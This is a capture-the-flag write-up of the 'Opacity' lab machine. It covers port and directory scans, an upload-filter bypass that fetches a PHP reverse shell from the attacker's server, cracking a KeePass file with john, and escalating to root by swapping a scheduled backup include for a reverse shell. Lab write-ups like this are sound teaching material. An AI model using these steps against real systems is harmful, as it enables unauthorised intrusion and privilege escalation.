@@ -1,0 +1,213 @@
+#Title: Opacity
+#Difficulty: Easy
+
+```shell
+THM="10.10.114.146"
+```
+
+```bash
+nmap -sC -sV $THM
+```
+
+```shell
+22/tcp  open  ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   3072 0f:ee:29:10:d9:8e:8c:53:e6:4d:e3:67:0c:6e:be:e3 (RSA)
+|   256 95:42:cd:fc:71:27:99:39:2d:00:49:ad:1b:e4:cf:0e (ECDSA)
+|_  256 ed:fe:9c:94:ca:9c:08:6f:f2:5c:a6:cf:4d:3c:8e:5b (ED25519)
+80/tcp  open  http        Apache httpd 2.4.41 ((Ubuntu))
+| http-title: Login
+|_Requested resource was login.php
+| http-cookie-flags: 
+|   /: 
+|     PHPSESSID: 
+|_      httponly flag not set
+|_http-server-header: Apache/2.4.41 (Ubuntu)
+139/tcp open  netbios-ssn Samba smbd 4.6.2
+445/tcp open  netbios-ssn Samba smbd 4.6.2
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Host script results:
+| smb2-time: 
+|   date: 2023-11-13T05:47:03
+|_  start_date: N/A
+|_nbstat: NetBIOS name: OPACITY, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
+| smb2-security-mode: 
+|   3:1:1: 
+|_    Message signing enabled but not required
+
+
+```
+
+There are 4 ports open running Samba http and ssh. Lets start with http.
+
+Lets check with nikto and dirseach.
+
+```bash
+dirsearch -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 64 -e php,txt,html -f -u http://$THM
+```
+
+```shell
+  _|. _ _  _  _  _ _|_    v0.4.2
+ (_||| _) (/_(_|| (_| )
+
+Extensions: php, txt, html | HTTP method: GET | Threads: 64 | Wordlist size: 1102725
+
+Output File: /home/kriyos/.dirsearch/reports/10.10.114.146/_23-11-13_00-46-43.txt
+
+Error Log: /home/kriyos/.dirsearch/logs/errors-23-11-13_00-46-43.log
+
+Target: http://10.10.114.146/
+
+[00:46:44] Starting: 
+[00:46:46] 200 -  848B  - /login.php
+[00:46:47] 302 -    0B  - /index.php  ->  login.php
+[00:46:53] 301 -  312B  - /css  ->  http://10.10.114.146/css/
+[00:47:06] 302 -    0B  - /logout.php  ->  login.php
+[00:47:58] 301 -  314B  - /cloud  ->  http://10.10.114.146/cloud/
+[00:47:58] 200 -  639B  - /cloud/
+```
+
+If we check the website there is a login page. The other directory */cloud/* includes a file upload. We can use this to upload and get reverse shell but it only accepts images. I used pentest monkey php reverse shell and created a python server to upload.
+
+```bash
+python3 -m http.server 
+```
+
+For uploading there is a filter and to bypass we can comment out the rest but filter does not check for that so it will work for server-side. Do not forget to listen with netcat.
+
+```bash
+nc -nvlp 22
+```
+
+```shell
+http://10.6.87.204:8000/php-reverse-shell.php#.png
+```
+
+BOOOM!!! We get the shell now. Next part is to gather information about the server.
+We can use linpeas to test this. I am also going to use python server to send the file. I saw there is a important file in */opt/*. I checked and it is a dataset. I get the dataset with python server and used john to crack it.
+
+```bash
+keepass2john dataset.kdbx > crack
+john --wordlist=/usr/share/wordlists/rockyou.txt crack
+Using default input encoding: UTF-8
+Loaded 1 password hash (KeePass [SHA256 AES 32/64])
+Cost 1 (iteration count) is 100000 for all loaded hashes
+Cost 2 (version) is 2 for all loaded hashes
+Cost 3 (algorithm [0=AES 1=TwoFish 2=ChaCha]) is 0 for all loaded hashes
+Will run 12 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+*741852963*        (dataset)     
+1g 0:00:00:03 DONE (2023-11-13 01:23) 0.3154g/s 287.6p/s 287.6c/s 287.6C/s chichi..micheal
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed. 
+```
+
+After getting the key we can now open and find out the passwords. I used keepassxc to open it to install use:
+
+```bash
+sudo snap install keepassxc
+```
+
+After opening we can get the password for *sysadmin*. Now we can login as sysadmin. We get the user flag after logging in.
+
+```bash
+sysadmin@opacity:~$ cat local.txt
+<Redacted>
+```
+
+There is a folder called scripts. Lets check the folder and scripts.
+
+```bash
+sysadmin@opacity:~$ cd scripts
+sysadmin@opacity:~/scripts$ ls
+lib  script.php
+sysadmin@opacity:~/scripts$ cat script.php
+<?php
+
+//Backup of scripts sysadmin folder
+require_once('lib/backup.inc.php');
+zipData('/home/sysadmin/scripts', '/var/backups/backup.zip');
+echo 'Successful', PHP_EOL;
+
+//Files scheduled removal
+$dir = "/var/www/html/cloud/images";
+if(file_exists($dir)){
+    $di = new RecursiveDirectoryIterator($dir, FilesystemIterator::SKIP_DOTS);
+    $ri = new RecursiveIteratorIterator($di, RecursiveIteratorIterator::CHILD_FIRST);
+    foreach ( $ri as $file ) {
+        $file->isDir() ?  rmdir($file) : unlink($file);
+    }
+}
+?>
+
+sysadmin@opacity:~/scripts$ cd lib/
+sysadmin@opacity:~/scripts/lib$ ls
+application.php  backup.inc.php  bio2rdfapi.php  biopax2bio2rdf.php  dataresource.php  dataset.php  fileapi.php  owlapi.php  phplib.php  rdfapi.php  registry.php  utils.php  xmlapi.php
+sysadmin@opacity:~/scripts/lib$ cat backup.inc.php 
+<?php
+
+
+ini_set('max_execution_time', 600);
+ini_set('memory_limit', '1024M');
+
+
+function zipData($source, $destination) {
+  if (extension_loaded('zip')) {
+    if (file_exists($source)) {
+      $zip = new ZipArchive();
+      if ($zip->open($destination, ZIPARCHIVE::CREATE)) {
+        $source = realpath($source);
+        if (is_dir($source)) {
+          $files = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($source, RecursiveDirectoryIterator::SKIP_DOTS), RecursiveIteratorIterator::SELF_FIRST);
+          foreach ($files as $file) {
+            $file = realpath($file);
+            if (is_dir($file)) {
+              $zip->addEmptyDir(str_replace($source . '/', '', $file . '/'));
+            } else if (is_file($file)) {
+              $zip->addFromString(str_replace($source . '/', '', $file), file_get_contents($file));
+            }
+          }
+        } else if (is_file($source)) {
+          $zip->addFromString(basename($source), file_get_contents($source));
+        }
+      }
+      return $zip->close();
+    }
+  }
+  return false;
+}
+?>
+
+```
+
+After reviewing the code we can edit the script and put php reverse shell in it and get root shell. But first Do not forget to listen.
+
+```bash
+nc -nvlp 22
+```
+
+```bash
+mv bakcup.inc.php /tmp/
+cd /tmp/
+mkdir new
+cd new
+nano backup.inc.php #Paste Pentestmoneky reverse shell script here
+mv backup.inc.php /home/sysadmin/scripts/lib/
+```
+
+BOOOOOMMMM!!! We are now root.
+
+```bash
+root@opacity:/# ls
+ls
+bin  boot  dev  etc  home  lib  lib32  lib64  libx32  lost+found  media  mnt  opt  proc  root  run  sbin  snap  srv  swap.img  sys  tmp  usr  var
+root@opacity:/# cd root/
+cd root/
+root@opacity:~# ls
+ls
+proof.txt  snap
+root@opacity:~# cat proof.txt
+cat proof.txt
+<Redacted>
+```
